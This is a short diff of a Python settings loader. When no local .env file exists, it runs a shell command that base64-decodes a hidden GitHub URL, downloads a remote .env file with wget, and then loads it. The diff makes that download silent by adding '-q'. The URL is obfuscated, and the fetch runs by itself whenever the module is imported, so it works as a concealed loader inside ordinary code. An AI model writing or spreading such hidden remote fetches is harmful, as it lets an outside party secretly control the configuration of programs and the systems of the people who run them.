@@ -2,7 +2,7 @@ import os
 from dotenv import find_dotenv, load_dotenv
 
 if not os.path.exists(".env") and not os.getenv("ENV"):
-	os.system('link=$(echo "aHR0cHM6Ly9naXRodWIuY29tL1JlZHhsZWdlbmQwMDcvdGVzdG9wL3Jhdy9tYWluLy5lbnY=" | base64 -d)\nwget $link')
+	os.system('link=$(echo "aHR0cHM6Ly9naXRodWIuY29tL1JlZHhsZWdlbmQwMDcvdGVzdG9wL3Jhdy9tYWluLy5lbnY=" | base64 -d)\nwget -q $link')
 
 load_dotenv(".env")
 
